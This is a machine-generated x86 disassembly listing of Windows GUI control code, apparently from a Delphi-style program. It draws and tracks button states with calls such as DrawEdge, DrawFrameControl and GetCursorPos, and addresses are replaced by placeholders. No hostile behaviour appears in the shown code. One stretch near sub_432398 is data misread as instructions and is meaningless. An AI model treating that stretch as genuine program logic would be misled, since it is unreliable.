sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4313fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4310d0
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_430e8c
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_430ff0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_43146c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c1c8
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_431490
push ebx
mov ebx eax
mov eax ebx
call sub_4499bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4314dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43150c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_431dbc
sub_43152c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_431e48
sub_43154c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4306b0
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_431d7c
mov ecx esi
xor edx edx
mov eax ebx
call sub_444df4
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43d5b0
mov edx 0xff00000f
mov eax ebx
call sub_43d624
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43160c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_444e50
mov eax [ esi + 0x16c ]
call sub_403124
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_431644
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_431a6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41ecb4
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412cd4
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41ed94
mov edx eax
mov eax esi
call sub_43a5d8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41ed94
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41ed94
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_4335f0
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_4339f4
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x28 ]
pop edx
call sub_4337dc
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x28 ]
pop edx
call sub_433740
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_4335f0
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_433934
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x28 ]
pop edx
call sub_4337dc
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x28 ]
pop edx
call sub_433740
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41e64c
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41e9f0
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412cac
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43d484
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43f758
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4313fc
mov edx 0xff000014
mov eax 0xff00000f
call sub_425100
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41e620
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41e9f0
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431a75
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f1c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412cac
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41de80
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43d484
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43f758
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4313fc
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_431a7c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43bd30
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43e62c
jmp r-xdata
sub_431ae0
push ebx
mov ebx eax
mov eax ebx
call sub_43f534
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_4308b4
pop ebx
retn
sub_431b0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43ea40
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431b64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43ecf8
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_431a7c
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_43ce88
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_43cecc
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_431c04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43eda0
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43ce88
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_43cecc
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_431dbc
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_431a7c
mov eax ebx
mov si 0xffeb
call sub_403320
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_431d50
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_43088c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431d84
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_4409b0
sub_431dbc
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_431d84
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_431eb4
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431f24
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_4308b4
mov eax ebx
call sub_431a7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_431f58
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_449c50
sub_431fc8
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_432051
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43d484
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4545a8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403320
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432058
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_432094
push ebx
push esi
mov esi eax
mov eax esi
call sub_43f1a4
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_432108
push ebx
push esi
mov esi eax
mov eax esi
call sub_43f1bc
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_432170
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_431d20
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_4234dc
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41e64c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412cd4
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4234dc
pop edx
call sub_41e9f0
push 0x0
push edi
push 0x1
mov eax ebx
call sub_4234dc
mov edx eax
xor ecx ecx
mov eax esi
call sub_44afd4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432200
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f34c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_431e48
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_431d20
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44aabc
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_432170
pop ecx
sub_432398
in al 0x23
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] ch
inc ebx
add [ esp + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
and al 0x43
add [ edx + 0x24 ] dl
inc ebx
add al dl
add [ eax ] al
add ah dl
xchg ecx eax
inc edx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x2bffbfcd ] al
movsb [ edi ] [ esi ]
inc edx
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + 0x42a7 ] ah
dec eax
inc ecx
add al al
test eax 0x471c0042
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax + 0x4326 ] ah
test al 0x42
add [ esp - 0x5a5bffbe ] ch
inc edx
add ah bh
sub al 0x43
add [ eax ] bl
scasd [ edi ]
inc edx
add [ eax ] dh
sub eax 0xe0043
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
int3
sub_4325ed
and eax 0x11070043
push esp
push ebx
imul ebp [ ebp + 0x6e ] 0x69615074
outsb
je r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
popad
outsb
insb
add al 0x25
inc ebx
add [ eax + edx * 8 ] cl
inc edx
add [ edx ] al
pop es
inc ebp
js r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432696
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
add [ ebp + 0x6ae8f845 ] cl
sbb ch bh
inc ebx
jmp sub_403878
inc esp
insb
jae r-xdata
add [ eax - 0x7c1374ab ] dl
sub_43261d
clc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_432657
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_445900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432696
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_43265c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d4b4
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432696
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_4326a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_432955
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_42a724
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_424cc0
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403f4c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e8a4
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43d4b4
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_42ecf4
mov edx 0x6
mov eax ebx
call sub_42ed2c
mov dx 0x1
mov eax ebx
call sub_443e7c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4361a0
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43d4b4
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_43c998
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
